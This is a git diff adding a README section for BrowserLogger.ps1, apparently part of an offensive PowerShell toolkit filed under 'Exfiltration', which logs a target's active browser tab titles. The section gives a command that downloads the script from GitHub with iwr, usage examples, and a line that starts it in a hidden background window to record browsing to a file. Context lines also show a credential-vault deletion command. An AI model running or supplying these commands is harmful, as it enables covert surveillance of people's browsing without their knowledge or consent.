@@ -276,3 +276,41 @@ Get-Help .\Invoke-VaultCmd.ps1 -full
 #Delete resource 'MyCredential' with 'BillGates' username and comrrespondent creds from vault
 .\Invoke-VaultCmd.ps1 -action "delete" -resource "MyCredential" -username "SKYNET\pedro"
 ```
+
+
+
+<br />
+
+## BroserLogger.ps1
+
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[BroserLogger](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Exfiltration/browserLogger.ps1)|Spy target active tab browsing history (windows title)|UserLand|[screenshot](https://user-images.githubusercontent.com/23490060/216802415-192429ed-66d3-479d-a9a9-1a2aa974a12c.png)|
+
+|Parameter|Description|Default value|
+|---|---|---|
+|Delay|Delay time (seconds) between captures|3|
+|Log|Switch that creates cmdlet results logfile|\*\*\*|
+|Force|Bypass: none supported browsers found active|false|
+
+<br />
+
+**download cmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
+```
+
+**execute:**
+```powershell
+#cmdlet help
+Get-Help .\browserLogger.ps1 -full
+
+#Enumerate with 5 secs between captures
+.\BrowserLogger.ps1 -delay '5'
+
+#store results on logfile ($pwd\Browser.report)
+.\BrowserLogger.ps1 -log
+
+#Execute cmdlet in background even if none browsers are found 'active' and store results on $pwd\Browser.report
+PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file BrowserLogger.ps1 -force 'true' -log"
+```
